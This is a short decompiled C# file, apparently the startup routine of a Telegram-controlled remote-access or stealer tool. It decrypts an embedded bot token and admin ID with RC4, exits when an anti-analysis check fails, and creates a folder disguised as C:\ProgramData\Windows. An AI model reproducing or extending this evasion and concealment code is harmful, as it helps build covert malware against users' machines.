using System;
using Telegram.Bot;
using TelegramBot.Anti;

namespace TelegramBot
{
	// Token: 0x02000004 RID: 4
	internal class Start
	{
		// Token: 0x0600000D RID: 13 RVA: 0x000020FF File Offset: 0x000002FF
		private static void GDKJFG()
		{
			Program.Bot = new Api(RC4.Decrypt(Program.fghdf, Program.N));
			Program.AdminId = (int)Convert.ToInt64(RC4.Decrypt(Program.here, Program.N));
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002134 File Offset: 0x00000334
		public static void GFHGFH()
		{
			if (!Program.Cheching())
			{
				Environment.Exit(0);
			}
			Run.CFLcreate("C:\\ProgramData\\Windows");
			Start.GDKJFG();
			Commands.ListCommands();
			Read.FuncRun("config.xml");
			Program.Run().Wait();
		}
	}
}
